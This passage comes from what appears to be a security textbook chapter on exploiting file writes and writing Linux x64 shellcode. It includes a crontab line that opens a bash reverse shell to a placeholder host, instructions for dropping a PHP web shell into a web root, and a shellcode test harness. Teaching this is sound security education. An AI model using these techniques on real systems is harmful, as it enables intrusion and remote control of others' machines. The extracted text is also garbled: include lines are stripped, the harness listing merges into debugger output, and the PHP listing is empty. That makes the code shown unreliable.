    && session->is_admin) {
  system(c->data);
}
Listing 10-8: Opening the run command as an administrator
By discovering the location of the session object in memory, you can change the is_admin
value from 0 to 1, opening the run command for the attacker to gain control over the target
system. We could also change the socket value to point to another file, causing the
application to write data to an arbitrary file when writing a response, because in most
Unix-like platforms, file descriptors and sockets are effectively the same type of resource.
You can use the write system call to write to a file, just as you can to write to the socket.
Although this is a contrived example, it should help you understand what happens in
real-world networked applications. For any application that uses some sort of
authentication to separate user and administrator responsibilities, you could typically
subvert the security system in this way.
Exploiting High-Privileged File Writes
If an application is running with elevated privileges, such as root or administrator
privileges, your options for exploiting an arbitrary file write are expansive. One technique
is to overwrite executables or libraries that you know will get executed, such as the
executable running the network service you’re exploiting. Many platforms provide other
means of executing code, such as scheduled tasks, or cron jobs on Linux.
If you have high privileges, you can write your own cron jobs to a directory and execute
them. On modern Linux systems, there’s usually a number of cron directories already inside
/etc that you can write to, each with a suffix that indicates when the jobs will be executed.
However, writing to these directories requires you to give the script file executable
permissions. If your arbitrary file write only provides read and write permissions, you’ll
need to write to /etc/cron.d with a Crontab file to execute arbitrary system commands.
Listing 10-9 shows an example of a simple Crontab file that will run once a minute and
connect a shell process to an arbitrary host and TCP port where you can access system
commands.
* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'
Listing 10-9: A simple reverse shell Crontab file
This Crontab file must be written to /etc/cron.d/run_shell. Note that some versions of
bash don’t support this reverse shell syntax, so you would have to use something else, such
as a Python script, to achieve the same result. Now let’s look at how to exploit write
Technet24
||||||||||||||||||||
||||||||||||||||||||
vulnerabilities with low-privileged file writes.
Exploiting Low-Privileged File Writes
If you don’t have high privileges when a write occurs, all is not lost; however, your options
are more limited, and you’ll still need to understand what is available on the system to
exploit. For example, if you’re trying to exploit a web application or there’s a web server
install on the machine, it might be possible to drop a server-side rendered web page, which
you can then access through a web server. Many web servers will also have PHP installed,
which allows you to execute commands as the web server user and return the result of that
command by writing the file shown in Listing 10-10 to the web root (it might be in
/var/www/html or one of many other locations) with a .php extension.
Listing 10-10: A simple PHP shell
After you’ve dropped this PHP shell to the web root, you can execute arbitrary
commands on the system in the context of the web server by requesting a URL in the form
http://server/shell.php?exec=CMD. The URL will result in the PHP code being executed on
the server: the PHP shell will extract the exec parameter from the URL and pass it to the
system API, with the result of executing the arbitrary command CMD.
Another advantage of PHP is that it doesn’t matter what else is in the file when it’s
written: the PHP parser will look for the  tags and execute any PHP code within
those tags regardless of whatever else is in the file. This is useful when you don’t have full
control over what’s written to a file during the vulnerability exploitation.
Writing Shell Code
Now let’s look at how to start writing your own shell code. Using this shell code, you can
execute arbitrary commands within the context of the application you’re exploiting with
your discovered memory corruption vulnerability.
Writing your own shell code can be complex, and although I can’t do it full justice in
the remainder of this chapter, I’ll give you some examples you can build on as you
continue your own research into the subject. I’ll start with some basic techniques and
challenges of writing x64 code using the Linux platform.
Getting Started
||||||||||||||||||||
||||||||||||||||||||
To start writing shell code, you need the following:
• An installation of Linux x64.
• A compiler; both GCC and CLANG are suitable.
• A copy of the Netwide Assembler (NASM); most Linux distributions have a package
available for this.
On Debian and Ubuntu, the following command should install everything you need:
sudo apt-get install build-essential nasm
We’ll write the shell code in x64 assembly language and assemble it using nasm, a binary
assembler. Assembling your shell code should result in a binary file containing just the
machine instructions you specified. To test your shell code, you can use Listing 10-11,
written in C, to act as a test harness.
test_shellcode.c
 #include 
 #include 
 #include 
 #include 
 #include 
 #include 
 typedef int (*exec_code_t)(void);
 int main(int argc, char** argv) {
   if (argc  0x7fb6584f3001:      mov    $0x64,%eax
   (gdb) stepi
   0x00007fb6584f3006 in ?? ()
   1: x/i $rip
   => 0x7fb6584f3006:      retq
   (gdb)
   0x00000000004007f6 in main ()
   1: x/i $rip
   => 0x4007f6 : mov    %eax,%esi
Listing 10-14: Setting a breakpoint on a shell
When we execute the test harness, the debugger stops on a SIGTRAP signal ➊. The reason
Technet24
||||||||||||||||||||
||||||||||||||||||||
is that the processor has executed the int3 instruction, which acts as a breakpoint, resulting
in the OS sending the SIGTRAP signal to the process that the debugger handles. Notice that
when we print the instruction the program is currently running ➋, it’s not the int3
instruction but instead the mov instruction immediately afterward. We don’t see the int3
instruction because the debugger has automatically skipped over it to allow the execution
to continue.
Calling System Calls
The example shell code in Listing 10-12 only returns the value 100 to the caller, in this
case our test harness, which is not very useful for exploiting a vulnerability; for that, we
need the system to do some work for us. The easiest way to do that in shell code is to use
the OS’s system calls. A system call is specified using a system call number defined by the
OS. It allows you to call basic system functions, such as opening files and executing new
processes.
Using system calls is easier than calling into system libraries because you don’t need to
know the memory location of other executable code, such as the system C library. Not
needing to know library locations makes your shell code simpler to write and more
portable across different versions of the same OS.
However, there are downsides to using system calls: they generally implement much
lower-level functionality than the system libraries, making them more complicated to call,
as you’ll see. This is especially true on Windows, which has very complicated system calls.
But for our purposes, a system call will be sufficient for demonstrating how to write your
own shell code.
System calls have their own defined application binary interface (ABI) (see “Application
Binary Interface” on page 123 for more details). In x64 Linux, you execute a system call
using the following ABI:
• The number of the system call is placed in the RAX register.
• Up to six arguments can be passed into the system call in the registers RDI, RSI, RDX,
R10, R8 and R9.
• The system call is issued using the syscall instruction.
• The result of the system call is stored in RAX after the syscall instruction returns.
For more information about the Linux system call process, run man 2 syscall on a Linux
command line. This page contains a manual that describes the system call process and
defines the ABI for various different architectures, including x86 and ARM. In addition, man
2 syscalls lists all the available system calls. You can also read the individual pages for a
system call by running man 2 .
The exit System Call
||||||||||||||||||||
||||||||||||||||||||
To use a system call, we first need the system call number. Let’s use the exit system call as
an example.
How do we find the number for a particular system call? Linux comes with header files,
which define all the system call numbers for the current platform, but trying to find the
right header file on disk can be like chasing your own tail. Instead, we’ll let the C compiler
do the work for us. Compile the C code in Listing 10-15 and execute it to print the system
call number of the exit system call.
#include 
#include 
int main() {
  printf("Syscall: %d\n", SYS_exit);
  return 0;
}
Listing 10-15: Getting the system call number
On my system, the system call number for exit is 60, which is printed to my screen;
yours may be different depending on the version of the Linux kernel you’re using,
although the numbers don’t change very often. The exit system call specifically takes
process exit code as a single argument to return to the OS and indicate why the process
exited. Therefore, we need to pass the number we want to use for the process exit code
into RDI. The Linux ABI specifies that the first parameter to a system call is specified in
the RDI register. The exit system call doesn’t return anything from the kernel; instead, the
process (the shell) is immediately terminated. Let’s implement the exit call. Assemble
Listing 10-16 with nasm and run it inside the test harness.
BITS 64
; The syscall number of exit
mov rax, 60
; The exit code argument
mov rdi, 42
syscall
; exit should never return, but just in case.
ret
Listing 10-16: Calling the exit system call in shell code
Notice that the first print statement in Listing 10-16, which shows where the shell code
was loaded, is still printed, but the subsequent print statement for the return of the shell
code is not. This indicates the shell code has successfully called the exit system call. To
double-check this, you can display the exit code from the test harness in your shell, for
example, by using echo $? in bash. The exit code should be 42, which is what we passed in
the mov rdi argument.
The write System Call
Now let’s try calling write, a slightly more complicated system call that writes data to a file.
Technet24
||||||||||||||||||||
||||||||||||||||||||
Use the following syntax for the write system call:
ssize_t write(int fd, const void *buf, size_t count);
The fd argument is the file descriptor to write to. It holds an integer value that
describes which file you want to access. Then you declare the data to be written by
pointing the buffer to the location of the data. You can specify how many bytes to write
using count.
Using the code in Listing 10-17, we’ll pass the value 1 to the fd argument, which is the
standard output for the console.
BITS 64
%define SYS_write 1
%define STDOUT 1
_start:
  mov rax, SYS_write
; The first argument (rdi) is the STDOUT file descriptor
  mov rdi, STDOUT
; The second argument (rsi) is a pointer to a string
  lea rsi, [_greeting]
; The third argument (rdx) is the length of the string to write
  mov rdx, _greeting_end - _greeting
; Execute the write system call
  syscall
  ret
_greeting:
  db "Hello User!", 10
_greeting_end:
Listing 10-17: Calling the write system call in shell code
By writing to standard output, we’ll print the data specified in buf to the console so we
can see whether it worked. If successful, the string Hello User! should be printed to the shell
console that the test harness is running on. The write system call should also return the
number of bytes written to the file.
Now assemble Listing 10-17 with nasm and execute the binary in the test harness:
$ nasm -f bin -o shellcode.bin shellcode.asm
$ ./test_shellcode shellcode.bin
Mapped Address: 0x7f165ce1f000
Shell Result: -14
Instead of printing the Hello User! greeting we were expecting, we get a strange result,
-14. Any value returning from the write system call that’s less than zero indicates an error.